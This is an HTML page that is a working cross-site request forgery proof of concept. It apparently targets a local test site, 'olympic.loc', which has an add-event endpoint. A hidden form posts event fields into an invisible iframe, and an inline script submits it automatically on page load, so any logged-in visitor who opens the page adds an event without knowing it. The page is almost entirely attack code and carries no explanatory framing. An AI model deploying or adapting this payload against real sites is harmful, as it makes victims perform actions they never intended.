<!DOCTYPE html>
<html>
	<head>
		<title>#bezgodov</title>
		<link rel="stylesheet" id="contextly" type="text/css" href="style.css">
		<meta charset="UTF-8">
	</head>
	<body>
		<h1>#bezgodov-Master</h1>
		<iframe style="display:none" name="csrf-frame"></iframe>
		<form action="http://olympic.loc/page/addevent" method="post" target="csrf-frame">
			<input type="text" name="title" value="title" hidden>
			<input type="text" name="date" placeholder="ДД-ММ-ГГГГ" value="13-12-2017" hidden>
			<input type="time" name="timeStart" hidden>
			<input type="text" name="place" hidden>
			<input type="text" name="organizer" hidden>
			<textarea name="description" hidden></textarea>
			<input type="submit" id="submit" value="Добавить мероприятие" name="submit" hidden>
		</form>
		<script>
			document.getElementById('submit').click();
		</script>
	</body>
</html>
